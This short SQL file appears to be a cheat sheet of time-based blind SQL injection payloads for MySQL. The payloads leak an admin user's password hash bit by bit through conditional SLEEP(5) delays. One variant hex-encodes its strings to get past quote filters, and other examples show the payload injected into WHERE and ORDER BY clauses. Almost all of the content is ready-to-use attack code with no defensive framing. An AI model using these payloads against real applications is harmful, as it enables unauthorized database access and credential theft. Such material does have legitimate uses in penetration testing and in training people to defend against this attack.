-- Leak a hash
SELECT IF((SELECT @a:=MID(BIN(FIND_IN_SET(MID(password, 1, 1), '0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f')), 1, 1) FROM users WHERE username='admin') != '', @a, SLEEP(5));
SELECT IF((SELECT @a:=MID(BIN(FIND_IN_SET(MID(password, 1, 1), 0x302c312c322c332c342c352c362c372c382c392c612c622c632c642c652c66)), 1, 1) FROM users WHERE username=0x61646d696e) != 0, @a, SLEEP(5));

-- Example: WHERE clause
SELECT * FROM posts WHERE 1=1 AND SELECT IF((SELECT @a:=MID(BIN(FIND_IN_SET(MID(password, 1, 1), '0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f')), 1, 1) FROM users WHERE username='admin') != MID(0x00, 1, 0), @a, SLEEP(5));

-- Example: ORDER BY clause
SELECT * FROM posts ORDER BY userid, (SELECT 1 UNION SELECT 2 WHERE SELECT IF((SELECT @a:=MID(BIN(FIND_IN_SET(MID(password, 1, 1), '0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f')), 1, 1) FROM users WHERE username='admin') != '', @a, SLEEP(5)));
